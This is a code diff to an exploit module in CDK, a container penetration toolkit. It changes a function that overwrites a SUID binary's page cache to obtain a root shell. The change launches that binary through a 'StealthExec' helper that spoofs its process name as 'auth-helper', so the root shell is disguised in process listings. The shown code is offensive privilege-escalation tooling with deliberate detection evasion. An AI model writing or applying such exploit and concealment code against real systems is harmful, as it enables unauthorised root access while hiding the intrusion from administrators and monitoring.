@@ -41,13 +41,13 @@ import (
 	"fmt"
 	"log"
 	"os"
-	"os/exec"
 	"syscall"
 	"unsafe"
 
 	"github.com/cdk-team/CDK/pkg/audit/base"
 	"github.com/cdk-team/CDK/pkg/cli"
 	"github.com/cdk-team/CDK/pkg/plugin"
+	"github.com/cdk-team/CDK/pkg/util"
 	"golang.org/x/sys/unix"
 )
 
@@ -245,11 +245,18 @@ func CopyFailExploit(targetBin string) error {
 	}
 
 	log.Println("[+] Page cache overwrite complete. Executing target binary for root shell...")
-	cmd := exec.Command(targetBin)
+	// Use StealthExec with argv[0] spoofing so the spawned SUID binary
+	// appears as "auth-helper" in process listings rather than showing
+	// the actual binary path (e.g., "/usr/bin/su").
+	cmd := util.StealthExecCommand(targetBin, util.StealthExecOptions{
+		Argv0: "auth-helper",
+		Comm:  "auth-helper",
+	})
 	cmd.Stdin = os.Stdin
 	cmd.Stdout = os.Stdout
 	cmd.Stderr = os.Stderr
-	return cmd.Run()
+	util.StealthExecStart(cmd, "auth-helper")
+	return cmd.Wait()
 }
 
 // Plugin interface
